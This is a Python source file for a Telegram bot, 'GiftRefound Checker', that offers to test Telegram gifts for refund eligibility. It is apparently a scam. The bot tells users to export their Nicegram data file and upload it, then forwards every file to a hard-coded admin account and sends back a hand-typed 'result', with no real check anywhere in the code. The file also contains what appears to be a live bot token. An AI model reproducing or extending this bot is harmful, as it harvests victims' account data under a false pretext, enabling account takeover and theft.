import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
from datetime import datetime
import time
import requests

BOT_TOKEN = "7956796612:AAFRjhOw_4yT0039kOnmMHQEdoDrJchT3go"
ADMIN_ID = 8362897345
DB = "refound_bot.db"

# Создаем бота с обработкой ошибок
bot = telebot.TeleBot(BOT_TOKEN)

def init_db():
    try:
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS checks (
                user_id INTEGER,
                username TEXT,
                file_id TEXT,
                status TEXT,
                check_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        conn.close()
        print("База данных инициализирована")
    except Exception as e:
        print(f"Ошибка базы данных: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    try:
        keyboard = InlineKeyboardMarkup()
        keyboard.row(InlineKeyboardButton("Проверить на Refound", callback_data="check_refound"))
        keyboard.row(InlineKeyboardButton("Инструкция", callback_data="instruction"))
        
        caption = """
<b>Добро пожаловать в GiftRefound Checker!</b>

Проверяйте Telegram-подарки на возможность возврата перед покупкой.
        """
        
        bot.send_photo(message.chat.id, "https://i.postimg.cc/gXgxWWVs/design-image.jpg", 
                      caption=caption, reply_markup=keyboard, parse_mode='HTML')
    except Exception as e:
        print(f"Ошибка в start: {e}")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        if call.data == "check_refound":
            instruction_text = """
<b>Отправьте файл данных Nicegram</b>

1. Откройте Nicegram
2. Настройки -> Nicegram 
3. Экспортировать в файл
4. Отправьте файл сюда

Проверка: 5-10 минут
            """
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("Назад", callback_data="back_to_menu"))
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                   caption=instruction_text, parse_mode='HTML', reply_markup=keyboard)
        
        elif call.data == "instruction":
            instruction_text = """
<b>Инструкция по проверке:</b>

1. Скачайте Nicegram
2. Экспортируйте данные
3. Отправьте файл боту
4. Получите результат
            """
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("Скачать Nicegram", url="https://nicegram.app"))
            keyboard.add(InlineKeyboardButton("Проверить файл", callback_data="check_refound"))
            keyboard.add(InlineKeyboardButton("Назад", callback_data="back_to_menu"))
            
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                   caption=instruction_text, parse_mode='HTML', reply_markup=keyboard)
        
        elif call.data == "back_to_menu":
            keyboard = InlineKeyboardMarkup()
            keyboard.row(InlineKeyboardButton("Проверить на Refound", callback_data="check_refound"))
            keyboard.row(InlineKeyboardButton("Инструкция", callback_data="instruction"))
            
            caption = "<b>Добро пожаловать в GiftRefound Checker!</b>"
            
            bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                   caption=caption, parse_mode='HTML', reply_markup=keyboard)
    
    except Exception as e:
        print(f"Ошибка в callback: {e}")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        user = message.from_user
        
        bot.reply_to(message, "Файл получен! Проверка займет 5-10 минут.", parse_mode='HTML')
        
        admin_text = f"""
Новый файл для проверки!

Пользователь: {user.first_name}
ID: {user.id}
Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Файл: {message.document.file_name}
        """
        
        # Пробуем отправить файл админу
        bot.send_document(ADMIN_ID, message.document.file_id, caption=admin_text, parse_mode='HTML')
        
        # Сохраняем в базу
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute("INSERT INTO checks (user_id, username, file_id, status) VALUES (?, ?, ?, ?)",
                   (user.id, user.username, message.document.file_id, "pending"))
        conn.commit()
        conn.close()
        
        print(f"Файл от {user.id} обработан")
        
    except Exception as e:
        print(f"Ошибка обработки файла: {e}")
        bot.reply_to(message, "Ошибка при обработке файла.")

@bot.message_handler(commands=['result'])
def send_result(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) < 2:
            bot.reply_to(message, "Использование: /result <user_id> <текст>")
            return
        
        user_id = int(args[0])
        result_text = " ".join(args[1:])
        
        bot.send_message(user_id, f"Результат проверки:\n\n{result_text}")
        bot.reply_to(message, "Результат отправлен")
        
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

def check_bot_token():
    """Проверка валидности токена"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getMe"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print("Токен валиден")
            return True
        else:
            print(f"Токен невалиден: {response.status_code}")
            return False
    except Exception as e:
        print(f"Ошибка проверки токена: {e}")
        return False

if __name__ == "__main__":
    print("Запуск бота...")
    
    # Проверяем токен
    if not check_bot_token():
        print("ОШИБКА: Неверный токен бота!")
        exit(1)
    
    init_db()
    
    # Запускаем бота с повторными попытками
    while True:
        try:
            print("Бот запущен")
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Ошибка бота: {e}")
            print("Перезапуск через 10 секунд...")
            time.sleep(10)
